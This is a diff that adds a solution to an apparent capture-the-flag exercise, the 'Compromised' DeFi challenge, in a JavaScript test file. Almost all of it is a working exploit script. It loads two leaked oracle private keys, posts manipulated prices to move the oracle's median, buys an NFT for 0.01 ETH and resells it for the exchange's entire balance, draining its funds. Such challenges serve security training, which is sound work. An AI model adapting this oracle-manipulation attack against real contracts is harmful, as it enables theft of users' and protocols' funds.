@@ -61,6 +61,78 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        const key1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        const key2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+
+        //generate wallet signers using the two keys given
+        const oracle1 = new ethers.Wallet(key1, ethers.provider);
+        const oracle2 = new ethers.Wallet(key2, ethers.provider);
+
+        console.log(oracle1.address);
+        console.log(oracle2.address);
+
+        //Connect the wallet signers to the oracle.
+        const oracle1Connection = this.oracle.connect(oracle1);
+        const oracle2Connection = this.oracle.connect(oracle2);
+
+        //median helper fucntion that sets the median price.
+
+        const setMedianPrice = async (amount) =>{
+
+            //This gets the Before Price
+            let currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
+            console.log("Current median price is", currMedianPrice.toString());
+
+            console.log("posting to oracle 1");
+            await oracle1Connection.postPrice("DVNFT",amount);
+
+            //This gets the price After oracle 1.
+            currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
+            console.log("Current median price is", currMedianPrice.toString());
+
+            console.log('posting to oracle 2');
+            await oracle2Connection.postPrice("DVNFT",amount);
+
+            //This gets the price after Oracle 2.
+            currMedianPrice = await this.oracle.getMedianPrice("DVNFT");
+            console.log("Current median price is", currMedianPrice.toString());
+
+        }
+        //set the price to 0.01.
+        let priceToSet = ethers.utils.parseEther("0.01");
+        await setMedianPrice(priceToSet);
+
+        //connect to the Exchange as the attacker
+        const attackExchange = this.exchange.connect(attacker);
+        const attackNFT = this.nftToken.connect(attacker);
+
+        //purchase the NFT.
+        await attackExchange.buyOne({
+            value: priceToSet
+        })
+        // Verify that we own the newly minted NFT.
+        const tokenId = 0;
+        const ownerId = await attackNFT.ownerOf(tokenId);
+        expect(ownerId).to.equal(attacker.address);
+
+        //set the Balance of Exchange.
+        console.log("Setting the price to balance of Exchange");
+        const balOfExchange = await ethers.provider.getBalance(this.exchange.address);
+
+        //Set the price of the NFT to the current balance of the Exchange.
+        priceToSet = balOfExchange
+        await setMedianPrice(priceToSet);
+
+        //Sell the NFT.
+        console.log("Sell the NFT for the median price");
+        await attackNFT.approve(attackExchange.address,tokenId);
+        await attackExchange.sellOne(tokenId);
+
+        //Restore oracle price to initial price to meet final condition.
+
+        priceToSet = INITIAL_NFT_PRICE;
+        await setMedianPrice(priceToSet);
+
     });
 
     after(async function () {
